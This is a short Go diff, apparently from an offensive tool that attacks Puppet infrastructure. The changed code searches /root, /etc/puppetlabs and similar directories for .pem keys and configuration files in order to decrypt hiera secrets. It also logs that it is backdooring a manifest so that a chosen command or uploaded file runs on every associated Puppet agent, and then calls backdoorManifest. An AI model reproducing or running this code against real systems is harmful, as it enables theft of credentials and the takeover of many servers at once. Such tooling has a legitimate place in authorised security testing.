@@ -245,7 +245,7 @@ func createModule(manifestLoc string, moduleName string, cmd string) {
 
 func getSecretKeys() map[string]*eyamlKeys {
 	keys := make(map[string]*eyamlKeys)
-	keyFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{}, debug)
+	keyFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{})
 	if len(keyFiles) == 0 {
 		log.Fatalln("Unable to find any files containing keys used with eyaml, exiting.")
 	}
@@ -280,7 +280,7 @@ func findHieraSecrets() {
 		return
 	}
 	secretKeys := getSecretKeys()
-	puppetFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{}, debug)
+	puppetFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{})
 
 	if len(puppetFiles) == 0 {
 		log.Fatalln("Unable to find any chef files, exiting.")
@@ -368,7 +368,12 @@ func main() {
 			log.Fatal("Exiting...")
 		}
 
-		moseutils.Msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
+		if uploadFileName != "" {
+			moseutils.Msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, uploadFileName)
+		} else {
+			moseutils.Msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
+		}
+
 		backdoorManifest(manifestLoc)
 		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
 		moseutils.Info("The following modules were found: %v", modules)
